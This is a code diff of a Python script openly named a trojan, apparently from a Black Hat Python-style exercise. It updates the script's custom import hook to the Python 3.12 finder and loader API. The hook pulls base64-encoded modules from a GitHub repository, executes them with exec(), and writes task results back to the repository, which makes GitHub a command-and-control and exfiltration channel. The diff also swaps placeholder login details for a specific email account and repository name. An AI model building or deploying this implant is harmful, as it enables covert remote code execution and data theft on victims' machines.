@@ -7,6 +7,8 @@ import random
 import threading
 import queue
 from github3 import login
+from importlib.abc import MetaPathFinder, Loader
+from importlib.machinery import ModuleSpec
 
 trojan_id = "abc"
 trojan_config = f"config/{trojan_id}.json"
@@ -15,28 +17,27 @@ trojan_modules = []
 configured = False
 task_queue = queue.Queue()
 
-class GitImporter:
-    def __init__(self):
-        self.current_module_code = ""
+class Python312Loader(Loader):
 
-    def find_module(self, fullname, path=None):
-        if configured:
-            print(f"[+] Attempting to retrieve {fullname}")
-            new_library = get_file_contents(f"modules/{fullname}.py")
-            if new_library:
-                self.current_module_code = base64.b64decode(new_library)
-                return self
+    def __init__(self, code_string):
+        self.code_string = code_string
+
+    def exec_module(self, module):
+        exec(self.code_string, module.__dict__)
+
+class Python312Finder(MetaPathFinder):
+
+    def find_spec(self, fullname, path=None, target=None):
+        print(f"[+] Attempting to retrieve {fullname}")
+        new_library = get_file_contents(f"modules/{fullname}.py")
+        if new_library:
+            self.code_string = base64.b64decode(new_library)
+            return ModuleSpec(fullname, Python312Loader(self.code_string))
         return None
 
-    def load_module(self, name):
-        module = types.ModuleType(name)
-        exec(self.current_module_code, module.__dict__)
-        sys.modules[name] = module
-        return module
-
 def connect_to_github():
-    gh = login(username="your_username", password="your_password")
-    repo = gh.repository("your_username", "your_repo")
+    gh = login(username="sunmingtao@gmail.com", password="")  # Replace with your GitHub credentials or token
+    repo = gh.repository("sunmingtao", "crawler")
     branch = repo.branch("main")
     return gh, repo, branch
 
@@ -74,7 +75,7 @@ def store_module_result(data):
     repo.create_file(remote_path, f"Commit message", data.encode())
     return
 
-sys.meta_path = [GitImporter()]
+sys.meta_path.append(Python312Finder())
 
 while True:
     if task_queue.empty():
